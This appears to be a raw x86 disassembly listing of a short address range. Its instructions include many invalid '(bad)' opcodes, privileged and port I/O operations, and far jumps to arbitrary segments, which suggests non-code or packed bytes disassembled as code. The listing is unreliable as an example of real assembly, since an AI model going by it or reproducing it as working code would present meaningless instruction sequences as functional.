  41a4fc:	mov    ds:0x282f084d,eax
  41a501:	iret   
  41a502:	xchg   ecx,eax
  41a503:	ja     0x41a4ea
  41a505:	outs   dx,DWORD PTR ds:[esi]
  41a506:	xor    BYTE PTR [edx],0x66
  41a509:	adc    eax,0x51010700
  41a50e:	les    edx,FWORD PTR [ebx-0x3e]
  41a511:	ret    
  41a512:	rcr    BYTE PTR [esi-0x16],1
  41a515:	jmp    0x41a4c0
  41a517:	adc    BYTE PTR [ecx+0x3bef603d],0xea
  41a51e:	(bad)  
  41a51f:	sbb    DWORD PTR ds:0x163564bb,eax
  41a525:	xor    BYTE PTR [edi-0x1a40547a],0xd1
  41a52c:	bound  esp,QWORD PTR [ebx+0x60fc8e5e]
  41a532:	mov    esi,0x326e2b5e
  41a537:	test   DWORD PTR [ebx],ecx
  41a539:	in     eax,dx
  41a53a:	jge    0x41a54f
  41a53c:	test   DWORD PTR [ebp-0x77],edx
  41a53f:	test   DWORD PTR [esi],ecx
  41a541:	dec    edx
  41a542:	mov    esi,0xfb9156b7
  41a547:	push   ss
  41a548:	data16 int 0x4a
  41a54b:	sbb    al,0xdd
  41a54d:	popf   
  41a54e:	dec    eax
  41a54f:	addr16 ffree st(3)
  41a552:	in     eax,0xd4
  41a554:	jmp    0xc97d:0x80733c54
  41a55b:	xchg   edx,eax
  41a55c:	mov    edx,0x7e12f428
  41a561:	mov    ch,0xa2
  41a563:	pop    eax
  41a564:	jge    0x41a5b6
  41a566:	add    bl,bl
  41a568:	sbb    ebx,ebx
  41a56a:	jmp    0x5ad74b5e
  41a56f:	push   cs
  41a570:	xor    cl,BYTE PTR [edx+0x1549cb7a]
  41a576:	out    0xa1,eax
  41a578:	adc    esp,DWORD PTR [edi+edx*8-0x61]
  41a57c:	jno    0x41a51a
  41a57e:	adc    eax,0x1ec35b8b
  41a583:	pop    eax
  41a584:	dec    eax
  41a585:	cmp    dl,bh
  41a587:	mov    BYTE PTR [edi-0xa],dl
  41a58a:	mov    DWORD PTR [eax+eiz*1+0x3e],edx
  41a58e:	jge    0x41a52a
  41a590:	cmc    
  41a591:	adc    bl,BYTE PTR [edx]
  41a593:	stos   DWORD PTR es:[edi],eax
  41a594:	cwde   
  41a595:	xor    DWORD PTR [eax-0x7bcb894c],0x8
  41a59c:	mov    ebp,0x26b35c5a
  41a5a1:	int    0x64
  41a5a3:	rcr    BYTE PTR [eax+edi*8],cl
  41a5a6:	xor    eax,0xf7294640
  41a5ab:	or     DWORD PTR [esi-0x79be61cb],esi
  41a5b1:	xchg   esi,eax
  41a5b2:	data16 (bad) 
  41a5b4:	cmp    DWORD PTR [ecx-0x7c7e5de7],esp
  41a5ba:	add    al,0x32
  41a5bc:	fsub   DWORD PTR [ebx]
  41a5be:	mov    cr0,edi
  41a5c1:	scas   al,BYTE PTR es:[edi]
  41a5c2:	fnstenv [ebp+ebx*1-0xb]
  41a5c6:	and    bl,BYTE PTR [ebx]
  41a5c8:	arpl   WORD PTR [esi],dx
  41a5ca:	xor    ebp,ecx
  41a5cc:	int    0x0
  41a5ce:	mov    DWORD PTR [ecx],eax
  41a5d0:	ins    BYTE PTR es:[edi],dx
  41a5d1:	inc    ebx
  41a5d2:	repnz adc BYTE PTR [ebx-0x33],ch
  41a5d6:	stc    
  41a5d7:	data16 sbb BYTE PTR [edi],bl
  41a5da:	cmc    
  41a5db:	mov    al,0x89
  41a5dd:	addr16 loope 0x41a618
  41a5e0:	or     al,0x31
  41a5e2:	lock or edx,DWORD PTR [esi-0x5248370e]
  41a5e9:	popa   
  41a5ea:	adc    al,BYTE PTR ds:0x46ed12e3
  41a5f0:	inc    eax
  41a5f1:	neg    BYTE PTR [eax]
  41a5f3:	dec    edi
  41a5f4:	call   0xb3359d0a
  41a5f9:	mov    bl,0xff
  41a5fb:	retf   
  41a5fc:	mov    esp,0x163298a5
  41a601:	jo     0x41a675
  41a603:	xor    eax,0x4023e12c
  41a608:	add    DWORD PTR [ecx],ebx
  41a60a:	jns    0x41a688
  41a60c:	pop    ecx
  41a60d:	nop
  41a60e:	xchg   DWORD PTR [esi-0x2f],eax
  41a611:	les    edx,FWORD PTR [eax-0x69]
  41a614:	push   0xffffffbe
  41a616:	das    
  41a617:	mov    ebp,DWORD PTR [esi+0x12]
  41a61a:	mov    edx,0x12b628ab
  41a61f:	mov    edi,0x1cb92b2f
  41a624:	inc    esi
  41a625:	inc    ebx
  41a626:	inc    edx
  41a627:	and    BYTE PTR [ecx+0x2d],dl
  41a62a:	out    0xe7,al
  41a62c:	sar    WORD PTR [ebx-0x74],1
  41a630:	scas   eax,DWORD PTR es:[edi]
  41a631:	or     eax,0x1f45d64d
  41a636:	dec    esi
  41a637:	dec    edi
  41a638:	cld    
  41a639:	dec    edx
  41a63a:	fld    st(4)
  41a63c:	jns    0x41a5dc
  41a63e:	inc    esi
  41a63f:	jmp    0x41a5ce
  41a641:	push   cs
  41a642:	sbb    eax,0xf55ab1ca
  41a647:	pop    edx
  41a648:	ins    DWORD PTR es:[edi],dx
  41a649:	aas    
  41a64a:	into   
  41a64b:	inc    edi
  41a64c:	mov    al,ds:0xeb76fd6e
  41a651:	push   0xc1269786
  41a656:	push   ecx
  41a657:	outs   dx,BYTE PTR ds:[esi]
  41a658:	jmp    0x41a5dc
  41a65a:	cli    
  41a65b:	lods   al,BYTE PTR ds:[esi]
  41a65c:	jno    0x41a6ab
  41a65e:	sub    dh,bh
  41a660:	loop   0x41a610
  41a662:	jnp    0x41a606
  41a664:	scas   eax,DWORD PTR es:[edi]
  41a665:	mov    WORD PTR [esi-0x3472a276],es
  41a66b:	ds or  al,0x0
  41a66e:	add    eax,0x51d9a93e
  41a673:	sub    DWORD PTR [ebx-0x76fd0f73],ebp
  41a679:	cmp    al,0xbd
  41a67b:	mov    al,0x6
  41a67d:	faddp  st(1),st
  41a67f:	sbb    al,0xee
  41a681:	xchg   ebx,eax
  41a682:	out    dx,eax
  41a683:	ret    0xe6c
  41a686:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a687:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a688:	dec    ecx
  41a689:	stos   DWORD PTR es:[edi],eax
  41a68a:	push   esi
  41a68b:	or     DWORD PTR [ecx+0x61],ebx
  41a68e:	mov    bh,0x82
  41a690:	add    BYTE PTR [ebx-0x212332ee],ch
  41a696:	or     ah,0x5
  41a699:	shl    BYTE PTR [ebp+0x2cd52a30],cl
  41a69f:	(bad)  
  41a6a0:	stc    
  41a6a1:	das    
  41a6a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6a3:	sar    BYTE PTR [eax],0xbf
  41a6a6:	jne    0x41a63b
  41a6a8:	mov    ds:0xfafda996,eax
  41a6ad:	sbb    DWORD PTR [edi+0x1834c1ce],esi
  41a6b3:	and    esp,esp
  41a6b5:	pop    edi
  41a6b6:	adc    BYTE PTR [esi+0x29],cl
  41a6b9:	inc    ebx
  41a6ba:	pop    es
  41a6bb:	enter  0x582b,0xc5
  41a6bf:	ss xor eax,0x569ba4ac
  41a6c5:	mov    edx,0x91669799
  41a6ca:	mov    ecx,0x1321fa7
  41a6cf:	mov    ebx,0xdf0af372
  41a6d4:	leave  
  41a6d5:	add    ch,BYTE PTR [eax-0x4c]
  41a6d8:	pop    eax
  41a6d9:	dec    ecx
  41a6da:	mov    ebx,0x6cdf9658
  41a6df:	enter  0xe089,0x39
  41a6e3:	cwde   
  41a6e4:	xor    eax,0xe8ff57b3
  41a6e9:	in     eax,dx
  41a6ea:	mov    dl,0xb8
  41a6ec:	out    0xf3,eax
  41a6ee:	jb     0x41a742
  41a6f0:	mov    ebp,0xc847b72f
  41a6f5:	dec    esi
  41a6f6:	mov    ah,0x34
  41a6f8:	in     al,0x4
  41a6fa:	mov    DWORD PTR [ebp+0x40],edx
  41a6fd:	jle    0x41a6b0
  41a6ff:	imul   esi,eax,0x4f
  41a702:	and    dh,BYTE PTR [ecx+ebp*8]
  41a705:	xor    bl,bh
  41a707:	fimul  WORD PTR [ecx+0x2f]
  41a70a:	retf   0xd93a
  41a70d:	mov    esp,0x4c9eb435
  41a712:	add    al,0xb
  41a714:	jbe    0x41a741
  41a716:	lock out dx,al
  41a718:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a719:	lds    esi,FWORD PTR [edi+0x90cc314]
  41a71f:	addr16 and al,0x33
  41a722:	in     al,0x26
  41a724:	sbb    eax,0xaf91a4ce
  41a729:	repz popf 
  41a72b:	leave  
  41a72c:	addr16 inc ebp
  41a72e:	dec    ecx
  41a72f:	sbb    BYTE PTR [edx],0x7b
  41a732:	in     al,dx
  41a733:	jno    0x41a6dd
  41a735:	stos   DWORD PTR es:[edi],eax
  41a736:	popa   
  41a737:	jmp    0x58b1:0x12dc9e34
  41a73e:	inc    edx
  41a73f:	data16 jbe 0x41a741
  41a742:	cwde   
  41a743:	mov    dh,0x16
  41a745:	cmc    
  41a746:	jno    0x41a72b
  41a748:	sbb    al,0x41
  41a74a:	xor    al,0x9d
  41a74c:	and    DWORD PTR [edx+eiz*4+0x5697e8b4],ebx
  41a753:	pop    ds
  41a754:	mov    cl,0x59
  41a756:	aas    
  41a757:	lahf   
  41a758:	out    dx,al
  41a759:	inc    ebp
  41a75a:	sub    edi,DWORD PTR cs:[edi-0x1b]
  41a75e:	dec    edx
  41a75f:	xor    eax,0xecacc10
  41a764:	fs out 0xb3,eax
  41a767:	or     ebx,DWORD PTR [ebx-0x28dfe28b]
  41a76d:	mov    ?,WORD PTR [edx+0x366a1df8]
  41a773:	pop    es
  41a774:	lock or BYTE PTR [ebp-0x61b58865],al
  41a77b:	icebp  
  41a77c:	outs   dx,DWORD PTR ds:[esi]
  41a77d:	fwait
  41a77e:	add    esp,DWORD PTR [ebp-0x6f]
  41a781:	dec    eax
  41a782:	adc    BYTE PTR [ecx-0x31c4bd17],al
  41a788:	fcom   QWORD PTR [edi+0x303f2362]
  41a78e:	jmp    0xb0bc:0x18e458fb
  41a795:	mov    bh,0x4a
  41a797:	(bad)  
  41a798:	mov    eax,ds:0xa964e3a
  41a79d:	div    DWORD PTR [eax-0x27]
  41a7a0:	nop
  41a7a1:	stos   BYTE PTR es:[edi],al
  41a7a2:	fxtract 
  41a7a4:	scas   eax,DWORD PTR es:[edi]
  41a7a5:	leave  
  41a7a6:	and    al,0xa0
  41a7a8:	fistp  QWORD PTR [edi+0x3c]
  41a7ab:	and    eax,0x458fc0e3
  41a7b0:	mov    edi,0x3e89b5ad
  41a7b5:	dec    esp
  41a7b6:	mov    ebp,0xa08b0e2a
  41a7bb:	dec    esp
  41a7bc:	arpl   WORD PTR [edx-0x7ff52ac8],sp
  41a7c2:	cwde   
  41a7c3:	sbb    ah,BYTE PTR [esi+0x2f19582e]
  41a7c9:	out    0x2,al
  41a7cb:	sub    al,0x11
  41a7cd:	jecxz  0x41a76d
  41a7cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7d0:	shl    DWORD PTR ds:0x9ff30cc3,0xfe
  41a7d7:	mov    dh,0x8d
  41a7d9:	pop    ss
  41a7da:	(bad)  
  41a7db:	xchg   edx,eax
  41a7dc:	movsx  ecx,WORD PTR [ecx-0x4ed63554]
  41a7e3:	pop    ebp
  41a7e4:	sbb    bl,cl
  41a7e6:	ja     0x41a842
  41a7e8:	xchg   edx,eax
  41a7e9:	add    BYTE PTR [ebp-0x53],dl
  41a7ec:	and    al,0xd1
  41a7ee:	and    eax,0x912027a0
  41a7f3:	pusha  
  41a7f4:	fs jno 0x41a80a
  41a7f7:	and    BYTE PTR [eax+0x2b],bl
  41a7fa:	pusha  
  41a7fb:	sar    bh,cl
  41a7fd:	sti    
  41a7fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7ff:	xlat   BYTE PTR ds:[ebx]
  41a800:	add    BYTE PTR ds:0x1892cfdf,ah
  41a806:	int3   
  41a807:	data16 hlt 
  41a809:	mov    edx,0xecd7e0e3
  41a80e:	enter  0xadbc,0x53
  41a812:	das    
  41a813:	fidivr WORD PTR [ecx+eax*2-0x4d007b58]
  41a81a:	mov    dl,0xf4
  41a81c:	dec    eax
  41a81d:	mov    ah,0x8c
  41a81f:	jb     0x41a7a9
  41a821:	mov    al,ds:0x4ed0e801
  41a826:	lods   eax,DWORD PTR ds:[esi]
  41a827:	in     eax,dx
  41a828:	lock sub eax,DWORD PTR [esi+0x13]
  41a82c:	loope  0x41a848
  41a82e:	sbb    eax,0xba8b27dc
  41a833:	out    0xa7,al
  41a835:	outs   dx,DWORD PTR ds:[esi]
  41a836:	mov    edi,0x3d6f2588
  41a83b:	jb     0x41a89d
  41a83d:	in     al,dx
  41a83e:	mov    ah,0xb8
  41a840:	mov    eax,ds:0x39acb5ef
  41a845:	xchg   edx,eax
  41a846:	mov    DWORD PTR [edx],ebx
  41a848:	mov    ecx,0x822add3a
  41a84d:	enter  0xc1dc,0x34
  41a851:	cwde   
  41a852:	fild   QWORD PTR [edx]
  41a854:	ins    BYTE PTR es:[edi],dx
  41a855:	(bad)  
  41a856:	or     DWORD PTR [ebx+edx*8],esp
  41a859:	or     eax,0x2af94938
  41a85e:	pop    ebp
  41a85f:	call   0x2d2b:0x3c45eb51
  41a866:	add    al,0xbf
  41a868:	jmp    0xd21a806a
  41a86d:	mov    al,0xac
  41a86f:	out    0x22,al
  41a871:	cwde   
  41a872:	jge    0x41a8b9
  41a874:	mov    WORD PTR [edx],?
  41a876:	add    dl,al
  41a878:	jmp    0x8c14f82a
  41a87d:	daa    
  41a87e:	mov    eax,0xbe07952
  41a883:	xor    eax,DWORD PTR [esi]
  41a885:	pop    ss
  41a886:	sub    ebp,DWORD PTR [edx-0x4]
  41a889:	inc    edi
  41a88a:	inc    ebx
  41a88b:	sub    eax,eax
  41a88d:	outs   dx,BYTE PTR ds:[esi]
  41a88e:	jecxz  0x41a86c
  41a890:	ss ins BYTE PTR es:[edi],dx
  41a892:	stos   DWORD PTR es:[edi],eax
  41a893:	xor    dh,BYTE PTR [ebx-0x44312af9]
  41a899:	push   0x90ec0ac6
  41a89e:	jge    0x41a848
  41a8a0:	clc    
  41a8a1:	jae    0x41a8a0
  41a8a3:	mov    bl,0xee
  41a8a5:	sub    BYTE PTR [edx-0x3a],0x69
  41a8a9:	xchg   BYTE PTR [esi-0x3e165102],ah
  41a8af:	ins    DWORD PTR es:[edi],dx
  41a8b0:	adc    eax,0x3f593862
  41a8b5:	cld    
  41a8b6:	lea    edx,[esi-0x11ccab46]
  41a8bc:	xor    ebp,DWORD PTR [esi-0x45cc1330]
  41a8c2:	pop    esi
  41a8c3:	cld    
  41a8c4:	aaa    
  41a8c5:	or     al,0xea
  41a8c7:	dec    ecx
  41a8c8:	inc    ebx
  41a8c9:	sbb    al,0xa8
  41a8cb:	mov    al,ds:0xd3237703
  41a8d0:	clc    
  41a8d1:	addr16 adc bl,bh
  41a8d4:	vmovaps ymm5,ymm5
  41a8d8:	mov    ebx,0x1ba3505d
  41a8dd:	gs nop
  41a8df:	cmp    eax,0x1baaa1a7
  41a8e4:	mov    ds:0x5fbab50d,al
  41a8e9:	push   ds
  41a8ea:	add    dl,BYTE PTR [ebp-0x5d]
  41a8ed:	addr16 clc 
  41a8ef:	xor    bh,BYTE PTR [ecx-0x10]
  41a8f2:	ins    DWORD PTR es:[edi],dx
  41a8f3:	(bad)  
  41a8f4:	aas    
  41a8f5:	mov    bh,0xaa
  41a8f7:	mov    DWORD PTR [ebp+0x7a116a1e],esp
  41a8fd:	(bad)  
  41a8fe:	jmp    0x41a957
  41a900:	aam    0x25
  41a902:	cmp    esi,DWORD PTR ds:0x5da08809
  41a908:	gs dec edi
  41a90a:	push   cs
  41a90b:	lock outs dx,DWORD PTR ds:[esi]
  41a90d:	loope  0x41a97e
  41a90f:	pushf  
  41a910:	sar    DWORD PTR [ebx],cl
  41a912:	(bad)  
  41a913:	push   ebx
  41a914:	or     cl,BYTE PTR [ebx]
  41a916:	not    DWORD PTR [ecx-0x59d504c4]
  41a91c:	clc    
  41a91d:	lock sbb al,dh
  41a920:	xchg   ecx,eax
  41a921:	jbe    0x41a8f4
  41a923:	inc    esi
  41a924:	xlat   BYTE PTR ds:[ebx]
  41a925:	jl     0x41a903
  41a927:	cmp    eax,0x2644bffc
  41a92c:	push   ecx
  41a92d:	out    dx,eax
  41a92e:	in     al,0x8f
  41a930:	cmp    al,0xb5
  41a932:	(bad)  
  41a933:	xchg   ebx,eax
  41a934:	jge    0x41a920
  41a936:	je     0x41a919
  41a938:	and    cl,bl
  41a93a:	push   ebp
  41a93b:	or     eax,DWORD PTR [eax+0x575d4c8e]
  41a941:	out    0xf0,eax
  41a943:	cmp    al,BYTE PTR [ebx]
  41a945:	in     al,dx
  41a946:	iret   
  41a947:	leave  
  41a948:	out    0xe9,al
  41a94a:	dec    edx
  41a94b:	sub    al,0xce
  41a94d:	sbb    ah,dh
  41a94f:	jbe    0x41a944
  41a951:	add    DWORD PTR [eax-0x63],eax
  41a954:	ins    DWORD PTR es:[edi],dx
  41a955:	push   0x7e
  41a957:	out    0xf4,al
  41a959:	stos   DWORD PTR es:[edi],eax
  41a95a:	inc    ebx
  41a95b:	add    BYTE PTR [ebx-0x15],dh
  41a95e:	push   es
  41a95f:	cli    
  41a960:	(bad)  
  41a961:	cmp    DWORD PTR [esi+0x30c13f71],esi
  41a967:	mov    ebx,0xb2efe2c8
  41a96c:	retf   0x34a7
  41a96f:	sub    al,0x5c
  41a971:	cmp    edx,DWORD PTR [edx-0x5f]
  41a974:	adc    al,0x13
  41a976:	out    0x26,al
  41a978:	mov    ecx,0x940a1c94
  41a97d:	loopne 0x41a9e3
  41a97f:	pop    ss
  41a980:	mov    ah,0x4d
  41a982:	mov    bl,0x6e
  41a984:	jp     0x41a9b3
  41a986:	sub    BYTE PTR [edx+0x10d5758b],cl
  41a98c:	cmp    eax,0xb67925da
  41a991:	pop    edx
  41a992:	push   ecx
  41a993:	inc    edx
  41a994:	mov    cl,0x1b
  41a996:	fst    QWORD PTR [ebx-0x5b]
  41a999:	push   ebx
  41a99a:	popf   
  41a99b:	call   0xee831a15
  41a9a0:	jecxz  0x41a9ea
  41a9a2:	in     al,0xe6
  41a9a4:	repnz mov esp,0x1324faf8
  41a9aa:	fld    DWORD PTR [eax+0x38d9c9b6]
  41a9b0:	loop   0x41aa1e
  41a9b2:	dec    esi
  41a9b3:	jecxz  0x41aa2c
  41a9b5:	lds    esi,FWORD PTR [edx-0x1c]
  41a9b8:	mov    ebx,0x370439d3
  41a9bd:	xor    al,BYTE PTR [eax]
  41a9bf:	pop    ecx
  41a9c0:	mov    ch,ah
  41a9c2:	leave  
  41a9c3:	xchg   edi,eax
  41a9c4:	in     eax,0xeb
  41a9c6:	imul   ecx,DWORD PTR ds:0x942208eb,0xda4b0599
  41a9d0:	push   edi
  41a9d1:	dec    ebp
  41a9d2:	inc    ebx
  41a9d3:	sub    dl,BYTE PTR [edi+0x23cd9545]
  41a9d9:	add    ecx,DWORD PTR [ebx]
  41a9db:	push   ebx
  41a9dc:	outs   dx,DWORD PTR ds:[esi]
  41a9dd:	test   DWORD PTR [esi-0x31],0xc1705b7e
  41a9e4:	stos   DWORD PTR es:[edi],eax
  41a9e5:	lods   eax,DWORD PTR ds:[esi]
  41a9e6:	inc    esi
  41a9e7:	dec    ebx
  41a9e8:	dec    ebp
  41a9e9:	sbb    BYTE PTR [eax+0x56],cl
  41a9ec:	in     eax,0x41
  41a9ee:	(bad)  
  41a9ef:	jmp    0xde53:0xb33a6b67
  41a9f6:	mov    esp,0x875c6a00
  41a9fb:	mov    edi,0xdc6fdff2
  41aa00:	call   0x36db:0xd2effb76
  41aa07:	inc    esp
  41aa08:	mov    WORD PTR [edi-0x3923d382],cs
  41aa0e:	(bad)  
  41aa0f:	enter  0xe389,0x67
  41aa13:	pop    ecx
  41aa14:	rol    DWORD PTR [ebx-0x45],1
  41aa17:	sub    ah,BYTE PTR [edx+esi*2-0x24990f7d]
  41aa1e:	loope  0x41a9c1
  41aa20:	inc    ebx
  41aa21:	pop    ds
  41aa22:	mov    ch,0xfa
  41aa24:	cli    
  41aa25:	inc    ebx
  41aa26:	fnstsw WORD PTR [ecx+0x4c853dd3]
  41aa2c:	cmc    
  41aa2d:	call   0x1edf8174
  41aa32:	sbb    ebx,DWORD PTR [edx-0x56e7d155]
  41aa38:	xor    eax,0x2cb024aa
  41aa3d:	fs (bad) 
  41aa3f:	pop    ebp
  41aa40:	dec    eax
  41aa41:	xchg   esi,eax
  41aa42:	into   
  41aa43:	sbb    eax,0x1e16f1f4
  41aa48:	push   esp
  41aa49:	inc    edi
  41aa4a:	pop    edi
  41aa4b:	or     BYTE PTR [edi],bh
  41aa4d:	mov    bh,0xf6
  41aa4f:	test   al,0x27
  41aa51:	xchg   ebx,eax
  41aa52:	jmp    0x56d8:0x6e76c357
  41aa59:	adc    BYTE PTR [edi],ah
  41aa5b:	xor    DWORD PTR [ebp+ebp*8-0x826e382],edi
  41aa62:	xor    eax,0x54cfd982
  41aa67:	add    DWORD PTR [eax+0x61abaea6],ebp
  41aa6d:	and    BYTE PTR [edi+0x1a726ed2],al
  41aa73:	cmp    DWORD PTR [ebp-0x24e1ffbe],0x3f
  41aa7a:	xor    eax,0xf80d23ba
  41aa7f:	mov    dl,0x46
  41aa81:	mov    al,ds:0xa67f63f0
  41aa86:	jmp    0x4de6e4f1
  41aa8b:	(bad)  
  41aa8c:	mov    eax,0x4d08a006
  41aa91:	in     al,dx
  41aa92:	arpl   WORD PTR [ebp+0x51],si
  41aa95:	mov    DWORD PTR [esi],0x25b7528f
  41aa9b:	inc    esi
  41aa9c:	pop    ecx
  41aa9d:	jo     0x41aacd
  41aa9f:	push   edx
  41aaa0:	mov    eax,edi
  41aaa2:	and    eax,0xfb2d199f
  41aaa7:	shl    edi,1
  41aaa9:	int3   
  41aaaa:	imul   eax,DWORD PTR [esi-0x3ab3bc1b],0xa88b335b
  41aab4:	(bad)  
  41aab5:	shl    bl,0x36
  41aab8:	inc    eax
  41aab9:	clc    
  41aaba:	cmp    ecx,DWORD PTR [esi+edx*2+0x41]
  41aabe:	adc    BYTE PTR [ebx],bl
  41aac0:	test   DWORD PTR ds:0x89fd92b1,0x1eb4dfae
  41aaca:	xor    ebp,ecx
  41aacc:	jecxz  0x41aa8c
  41aace:	xchg   edx,eax
  41aacf:	and    al,0xca
  41aad1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aad2:	push   edx
  41aad3:	ja     0x41aa78
  41aad5:	inc    edi
  41aad6:	(bad)  
  41aad7:	cmp    ebp,DWORD PTR [ecx]
  41aad9:	sahf   
  41aada:	dec    edi
  41aadb:	dec    edi
  41aadc:	out    0xe2,al
  41aade:	lock ss pop esi
  41aae1:	popf   
  41aae2:	in     al,0xe8
  41aae4:	gs jge 0x41aaea
  41aae7:	ror    DWORD PTR [edi+0x6c],1
  41aaea:	je     0x41ab23
  41aaec:	push   0xffffffbc
  41aaee:	shl    BYTE PTR [eax-0x7e9a7fd1],0x9b
  41aaf5:	call   0x7800:0x7bd647a4
  41aafc:	pop    ebp
  41aafd:	fild   QWORD PTR [edi-0x27c1e20c]
  41ab03:	dec    ebx
  41ab04:	xor    esi,edi
  41ab06:	sbb    DWORD PTR [ecx+0x44],0xe7be49a1
  41ab0d:	cmp    BYTE PTR [ecx+0x27b1ceba],cl
  41ab13:	or     dl,dl
  41ab15:	lods   eax,DWORD PTR ds:[esi]
  41ab16:	cld    
  41ab17:	and    ebp,esi
  41ab19:	jle    0x41ab76
  41ab1b:	sub    bh,BYTE PTR [eax]
  41ab1d:	and    dl,BYTE PTR [ecx-0xf]
  41ab20:	xlat   BYTE PTR ds:[ebx]
  41ab21:	mov    bh,0xeb
  41ab23:	cmp    BYTE PTR [esi],cl
  41ab25:	aas    
  41ab26:	cmp    cl,0x3
  41ab29:	jne    0x41aaad
  41ab2b:	icebp  
  41ab2c:	clc    
  41ab2d:	test   BYTE PTR fs:[eax],0xc2
  41ab31:	mov    dh,0xcd
  41ab33:	inc    ecx
  41ab34:	pop    edi
  41ab35:	jb     0x41aae7
  41ab37:	push   0xf3498601
  41ab3c:	clc    
  41ab3d:	scas   al,BYTE PTR es:[edi]
  41ab3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab3f:	popa   
  41ab40:	xchg   DWORD PTR [edi+0x57339d9],eax
  41ab46:	stc    
  41ab47:	cmc    
  41ab48:	sub    bl,BYTE PTR [ebp-0x642e92c8]
  41ab4e:	push   ss
  41ab4f:	pop    ds
  41ab50:	retf   0xf63a
  41ab53:	push   ecx
  41ab54:	push   edi
  41ab55:	(bad)  
  41ab57:	xor    BYTE PTR [ecx+0x20],cl
  41ab5a:	xor    DWORD PTR [edx-0x12],edi
  41ab5d:	loop   0x41aaff
  41ab5f:	xor    al,0x45
  41ab61:	stc    
  41ab62:	cmp    eax,0xda930400
  41ab67:	fimul  WORD PTR [ebp+0x62]
  41ab6a:	(bad)  
  41ab6b:	call   FWORD PTR es:[ecx]
  41ab6e:	xor    BYTE PTR [ecx],0x73
  41ab71:	clc    
  41ab72:	sub    eax,0x69c011c3
  41ab77:	jmp    0x53f80100
  41ab7c:	dec    esi
  41ab7d:	(bad)  
  41ab7e:	loopne 0x41ab11
  41ab80:	(bad)  [ecx+0x30]
  41ab83:	(bad)  
  41ab84:	rcl    DWORD PTR ds:0x9cadac71,cl
  41ab8a:	cdq    
  41ab8b:	or     DWORD PTR [ebx+0x15c0330c],edi
  41ab91:	fs push eax
  41ab93:	jmp    0xc800:0xb0f3c876
  41ab9a:	rol    DWORD PTR [ebx+0x72827235],1
  41aba0:	stos   DWORD PTR es:[edi],eax
  41aba1:	mov    al,0x5
  41aba3:	ja     0x41abaf
  41aba5:	repz or eax,0x184424b5
  41abab:	test   eax,0x38c07e0d
  41abb0:	out    dx,al
  41abb1:	ss into 
  41abb3:	dec    edx
  41abb4:	inc    esp
  41abb5:	jl     0x41abf9
  41abb7:	add    DWORD PTR [edx+eiz*4-0x3],eax
  41abbb:	jmp    0x41ac1e
  41abbd:	ins    DWORD PTR es:[edi],dx
  41abbe:	inc    eax
  41abbf:	mov    al,ds:0x3e5539df
  41abc4:	mov    esi,edi
  41abc6:	cmp    eax,0xa208ea1
  41abcb:	mov    ebp,0x75731e30
  41abd0:	clc    
  41abd1:	mov    ebp,0x8aded5ec
  41abd6:	(bad)  
  41abd7:	mov    bh,0xfd
  41abd9:	stos   BYTE PTR es:[edi],al
  41abda:	std    
  41abdb:	arpl   WORD PTR [edx],bp
  41abdd:	mov    cl,0x13
  41abdf:	jp     0x41abd9
  41abe1:	add    dh,BYTE PTR [eax+eax*4-0x36]
  41abe5:	fsubp  st(1),st
  41abe7:	lahf   
  41abe8:	xchg   edx,eax
  41abe9:	and    edx,DWORD PTR [esi-0x27c00120]
  41abef:	xor    esi,0xffffffae
  41abf2:	gs cld 
  41abf4:	clc    
  41abf5:	outs   dx,BYTE PTR ds:[esi]
  41abf6:	repz rol BYTE PTR ds:[ebp-0xf3fdfa4],0x5b
  41abff:	jnp    0x41aba5
  41ac01:	xor    BYTE PTR [esi+0x681660fe],bl
  41ac07:	punpckhbw mm4,mm6
  41ac0a:	(bad)  
  41ac0b:	mov    ebx,0x599fe2c
  41ac10:	mov    cs,WORD PTR [ebx+0x9]
  41ac13:	lods   al,BYTE PTR ds:[si]
  41ac15:	retf   
  41ac16:	fnstenv [ebx*8-0x370bcc92]
  41ac1d:	ret    0xdcc8
  41ac20:	jp     0x41ac6e
  41ac22:	xchg   edi,eax
  41ac23:	ror    dh,0xc3
  41ac26:	jnp    0x41ac76
  41ac28:	lea    edi,[edi]
  41ac2a:	pop    edi
  41ac2b:	stos   BYTE PTR es:[edi],al
  41ac2c:	in     eax,dx
  41ac2d:	aaa    
  41ac2e:	inc    edi
  41ac2f:	add    DWORD PTR [ecx+0x3f62a592],ebp
  41ac35:	pop    ebp
  41ac36:	mov    ds:0x39bda6e5,eax
  41ac3b:	call   0xdc27:0x4579d0f6
  41ac42:	cmp    ebp,DWORD PTR [ebx-0x5a]
  41ac45:	out    dx,al
  41ac46:	ret    
  41ac47:	pop    ss
  41ac48:	arpl   WORD PTR [ebp+0x60d01d17],cx
  41ac4e:	add    eax,ebx
  41ac50:	push   ss
  41ac51:	icebp  
  41ac52:	xchg   BYTE PTR ds:0x7acc2cd2,ah
  41ac58:	cmp    ecx,DWORD PTR [ecx-0x2e]
  41ac5b:	aam    0x71
  41ac5d:	sub    esi,edi
  41ac5f:	mov    ah,0xda
  41ac61:	dec    ebp
  41ac62:	aad    0x13
  41ac64:	and    eax,0x15a7cb0e
  41ac69:	in     al,dx
  41ac6a:	add    BYTE PTR [esi-0x68dd08cd],0x94
  41ac71:	stc    
  41ac72:	inc    ebp
  41ac73:	jae    0x41acdc
  41ac75:	ss push 0x1d
  41ac78:	inc    ebp
  41ac79:	sub    BYTE PTR [ecx],ch
  41ac7b:	pop    ebp
  41ac7c:	loop   0x41ac62
  41ac7e:	mov    ch,0xf5
  41ac80:	jg     0x41aca0
  41ac82:	aam    0x3e
  41ac84:	xchg   BYTE PTR [edi+0x6d],ch
  41ac87:	in     al,0x90
  41ac89:	idiv   BYTE PTR [edi+0x14]
  41ac8c:	sti    
  41ac8d:	xor    al,0x1
  41ac8f:	xlat   BYTE PTR ds:[ebx]
  41ac90:	xor    al,0x9c
  41ac92:	frstor [ebp+edi*4-0x531ae125]
  41ac99:	mov    esp,0xb637eed7
  41ac9e:	xchg   ebp,eax
  41ac9f:	and    al,BYTE PTR [ebx]
  41aca1:	cwde   
  41aca2:	in     eax,0x6b
